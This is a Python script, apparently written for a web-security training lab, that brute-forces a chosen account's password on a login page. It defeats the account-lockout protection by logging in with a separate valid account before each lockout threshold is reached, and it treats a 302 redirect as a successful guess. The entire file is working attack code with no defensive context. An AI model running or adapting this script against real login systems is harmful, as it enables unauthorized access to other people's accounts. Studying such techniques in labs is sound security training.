import requests

URL = "https://YOUR-LINK/login"
WORDLIST = "authentication/wordlist/passwords.txt"
# TODO: Update if the target has a different threshold
TARGET_USERNAME = "target_valid_username" # Account to brute force
RESET_USERNAME = "valid_username"  # Valid account username used to reset the lockout counter
RESET_PASSWORD = "valid_password"  # Valid account password for the reset account
LOCKOUT_THRESHOLD = 2  # Number of attempts allowed before lockout triggers

with open(WORDLIST) as wordlist_file:
    passwords = wordlist_file.read().splitlines()

print(f"[*] Target Username : {TARGET_USERNAME}")
print(f"[*] Total Passwords : {len(passwords)}")
print(f"[*] Reset Credentials : {RESET_USERNAME}:{RESET_PASSWORD}")
print(f"[*] Lockout Threshold : {LOCKOUT_THRESHOLD} attempts\n")
print("[*] Starting brute force with counter reset...\n")

# SESSION : reuses TCP connection across requests
# Faster than opening a new connection per request
session = requests.Session()

# REQUEST FUNCTION
# Sends a single POST login attempt and intercepts the raw status code
# allow_redirects=False lets us catch the 302 directly
# instead of following it and landing on the authenticated page
def send_login(username: str, password: str):
    data = {"username": username, "password": password}
    return session.post(URL, data=data, allow_redirects=False)

# MAIN LOOP
# Sequential only, order matters: reset must fire before lockout triggers
# Threading skipped, concurrent requests cannot guarantee server side arrival order
#
# 200 = failed login
# 302 = successful login (server redirects)
found = False

for index, password in enumerate(passwords):
    # Reset the lockout counter before it hits the threshold
    # Successful login resets the failed attempt counter server-side
    if index % LOCKOUT_THRESHOLD == 0:
        reset_response = send_login(RESET_USERNAME, RESET_PASSWORD)
        print(f"[~] Counter reset via {RESET_USERNAME}:{RESET_PASSWORD} | Status: {reset_response.status_code}")
    response = send_login(TARGET_USERNAME, password)
    print(f"[*] Trying: {password:<30} | Status: {response.status_code}")
    # 302 : valid password found, stop immediately
    if response.status_code == 302:
        print("\n[+] Valid Password Found!")
        print(f"[+] Username : {TARGET_USERNAME}")
        print(f"[+] Password : {password}")
        found = True
        break

if not found:
    print("\n[-] Password not found in wordlist")
    print("Try a different wordlist or verify the target username.")